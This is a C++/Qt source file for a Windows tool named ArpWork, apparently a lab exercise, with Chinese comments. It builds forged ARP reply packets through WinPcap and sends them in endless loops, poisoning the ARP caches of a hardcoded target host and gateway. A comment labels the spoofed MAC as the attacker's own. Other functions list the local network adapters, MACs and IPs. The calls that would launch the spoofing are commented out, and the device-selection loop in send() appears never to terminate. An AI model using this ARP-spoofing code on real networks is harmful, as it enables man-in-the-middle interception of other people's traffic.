#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include "ArpWork.h"
#include <WinSock2.h>
#include <Iphlpapi.h>
#include <iostream>
#include <sstream>
#include <string> 
#include "pcap.h"

ArpWork::ArpWork(QWidget* parent)
    : QMainWindow(parent)
{
    ui.setupUi(this);
}

ArpWork::~ArpWork()
{}

using namespace std;
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"wpcap")

//MAC地址
struct mac_address {
    u_char byte[6];
};

struct eth_head {
    mac_address destMAC;    	//目的MAC地址 6字节  
    mac_address sourceMAC;      //源MAC地址 6字节  
    u_short     type;           //帧类型, 0x0806是ARP帧的类型值
};

struct arp_head
{
    unsigned short  hardwareType;       //硬件类型
    unsigned short  protocolType;       //协议类型
    unsigned char   hardwareAddLen;     //硬件地址长度
    unsigned char   protocolAddLen;     //协议地址长度
    unsigned short  op;                 //op，操作类型
    mac_address     sourceMAC;          //发送方MAC地址
    unsigned long   sourceIP;           //发送方IP地址
    mac_address     destMAC;            //目的MAC地址
    unsigned long   destIP;             //目的IP地址
};

struct arp_packet
{
    eth_head apt_eth_head;
    arp_head apt_arp_head;
};

int Gate(pcap_t* adhandle , string TargetHostIP, string GateIP, u_char TargetHostMAC[6], u_char HostMAC[6])
{
    //伪造ARP Relpy包
    //目标信息
    string DstIP = "192.168.249.131";
    u_char DstMAC[6] = { 0x00,0x0C,0x29,0xDE,0x4F,0x78 };
    //源信息
    string SrcIP = "192.168.249.2";
    u_char SrcMAC[6] = { 0x00,0x50,0x56,0xC0,0x00,0x08 };   //假MAC地址（攻击机MAC）

    eth_head eh;        //以太网头
    arp_head ah;        //ARP头

    for (int i = 0; i < 6; i++)
        eh.destMAC.byte[i] = DstMAC[i];
    for (int i = 0; i < 6; i++)
        eh.sourceMAC.byte[i] = SrcMAC[i];
    eh.type = htons(0x0806);        //ARP类型

    ah.hardwareType = htons(0x0001);
    ah.protocolType = htons(0x0800);
    ah.hardwareAddLen = 0x06;
    ah.protocolAddLen = 0x04;
    ah.op = htons(0x0002);
    ah.sourceMAC = eh.sourceMAC;
    ah.sourceIP = inet_addr(SrcIP.c_str());
    ah.destMAC = eh.destMAC;
    ah.destIP = inet_addr(DstIP.c_str());

    arp_packet* apt = NULL;
    unsigned char sendbuffer[80];
    memset(sendbuffer, 0, sizeof(sendbuffer));
    apt = (arp_packet*)sendbuffer;
    apt->apt_eth_head = eh;
    apt->apt_arp_head = ah;

    while (true)
    {
        if (pcap_sendpacket(adhandle, sendbuffer, sizeof(sendbuffer)) != 0)
        {
            return -1;
        }
        Sleep(100);
    }
    return 0;
}

int Host(pcap_t* adhandle, string TargetHostIP, string GateIP, u_char HostMAC[6], u_char GateMAC[6])
{
    //伪造ARP Relpy包
    //目标信息
    string DstIP = "192.168.249.2";
    u_char DstMAC[6] = { 0x00,0x0C,0x29,0xDE,0x4F,0x78 };
    //源信息
    string SrcIP = "192.168.249.131";
    u_char SrcMAC[6] = { 0x00,0x50,0x56,0xC0,0x00,0x08 };   //假MAC地址（攻击机MAC）

    eth_head eh;        //以太网头
    arp_head ah;        //ARP头

    for (int i = 0; i < 6; i++)
        eh.destMAC.byte[i] = DstMAC[i];
    for (int i = 0; i < 6; i++)
        eh.sourceMAC.byte[i] = SrcMAC[i];
    eh.type = htons(0x0806);        //ARP类型

    ah.hardwareType = htons(0x0001);
    ah.protocolType = htons(0x0800);
    ah.hardwareAddLen = 0x06;
    ah.protocolAddLen = 0x04;
    ah.op = htons(0x0002);
    ah.sourceMAC = eh.sourceMAC;
    ah.sourceIP = inet_addr(SrcIP.c_str());
    ah.destMAC = eh.destMAC;
    ah.destIP = inet_addr(DstIP.c_str());

    arp_packet* apt = NULL;
    unsigned char sendbuffer[80];
    memset(sendbuffer, 0, sizeof(sendbuffer));
    apt = (arp_packet*)sendbuffer;
    apt->apt_eth_head = eh;
    apt->apt_arp_head = ah;

    while (true)
    {
        if (pcap_sendpacket(adhandle, sendbuffer, sizeof(sendbuffer)) != 0)
        {
            return -1;
        }
        Sleep(100);
    }
    return 0;
}

void ArpWork::send()
{
    pcap_if_t* alldevs;
    pcap_if_t* d;
    char* tam = (char*)"rpcap://";
    char errbuf[PCAP_ERRBUF_SIZE];
    //获取设备列表
    if (pcap_findalldevs_ex(tam, NULL, &alldevs, errbuf) == -1)
    {
        return;
    }
    int i = 0;

    for (d = alldevs; d != NULL; d = d->next)
    {
         i++;
    }

    if (i == 0)
    {
        return;
    }

    while (true)
    {
        QString number = ui.lineEdit_3->text();
        int n = number.toInt();

        if (n < 0 || n >= i)
        {
            pcap_freealldevs(alldevs);
            return ;
        }
        for (d = alldevs, i = 0; i < n+1; d = d->next, i++);
    }

    //打开与网络适配器绑定的设备
    pcap_t* adhandle;

    if ((adhandle = pcap_open(d->name, 65535, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errbuf)) == NULL)
    {
        pcap_freealldevs(alldevs);
        return;
    }
    pcap_freealldevs(alldevs);

    //发送模式
   // Gate(adhandle);
   // Host(adhandle);
}

void ArpWork::gethost() {
    //PIP_ADAPTER_INFO结构体指针存储本机网卡信息
    PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();
    //得到结构体大小,用于GetAdaptersInfo参数
    unsigned long stSize = sizeof(IP_ADAPTER_INFO);
    //调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量;其中stSize参数既是一个输入量也是一个输出量
    int nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
    //记录网卡数量
    int netCardNum = 0;
    //记录每张网卡上的IP地址数量
    int IPnumPerNetCard = 0;
    if (ERROR_BUFFER_OVERFLOW == nRel) {
        //如果函数返回的是ERROR_BUFFER_OVERFLOW
        //则说明GetAdaptersInfo参数传递的内存空间不够,同时其传出stSize,表示需要的空间大小
        //这也是说明为什么stSize既是一个输入量也是一个输出量
        //释放原来的内存空间
        delete pIpAdapterInfo;
        //重新申请内存空间用来存储所有网卡信息
        pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
        //再次调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量
        nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
    }
    if (ERROR_SUCCESS == nRel) {
        //输出网卡信息
         //可能有多网卡,因此通过循环去判断
        QString NetName, NetIP, NetMAC;
        while (pIpAdapterInfo) {

            netCardNum++;
            
            string count;
            stringstream sstr;
            sstr << netCardNum;
            count = sstr.str();

            NetName += "Net";
            NetName += count;
            NetName += " ";
            NetName += pIpAdapterInfo->Description;
            NetName += "\n";

            ui.plainTextEdit->setPlainText(NetName);

            char mac[128];
            sprintf_s(mac, 18, "%02X-%02X-%02X-%02X-%02X-%02X",
                pIpAdapterInfo->Address[0],
                pIpAdapterInfo->Address[1],
                pIpAdapterInfo->Address[2],
                pIpAdapterInfo->Address[3],
                pIpAdapterInfo->Address[4],
                pIpAdapterInfo->Address[5]
            );
            NetMAC += "MAC ";
            NetMAC += mac;
            NetMAC += "\n";

            ui.plainTextEdit_2->setPlainText(NetMAC);

            //可能网卡有多IP,因此通过循环去判断
            IP_ADDR_STRING* pIpAddrString = &(pIpAdapterInfo->IpAddressList);
            NetIP += "IP ";
            NetIP += pIpAddrString->IpAddress.String;
            NetIP += "\n";

            ui.plainTextEdit_3->setPlainText(NetIP);

            //do {
            //    cout << "IP ：" << pIpAddrString->IpAddress.String << endl;
           //     pIpAddrString = pIpAddrString->Next;
           // } while (pIpAddrString);

            pIpAdapterInfo = pIpAdapterInfo->Next;
        }
    }
    //释放内存空间
    if (pIpAdapterInfo) {
        delete pIpAdapterInfo;
        pIpAdapterInfo = NULL;
    }
}

void ArpWork::getIP(){
    PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();
    unsigned long stSize = sizeof(IP_ADAPTER_INFO);
    int nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
     
    if (ERROR_BUFFER_OVERFLOW == nRel) {
        pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
        nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
    }
    if (ERROR_SUCCESS == nRel) {
        QString IP;
        QString number = ui.lineEdit_3->text();
        int n = number.toInt();
        

        for (int i = 1; i < n; i++)
        {
            pIpAdapterInfo = pIpAdapterInfo->Next;
        }

        IP_ADDR_STRING* pIpAddrString = &(pIpAdapterInfo->IpAddressList);

        IP += pIpAdapterInfo->Description;
        IP += "\n";

        do {
            IP += "IP ";
            IP += pIpAddrString->IpAddress.String;
            IP += "\n";
            pIpAddrString = pIpAddrString->Next;

        } while (pIpAddrString);

        ui.plainTextEdit_4->setPlainText(IP);
    }
}
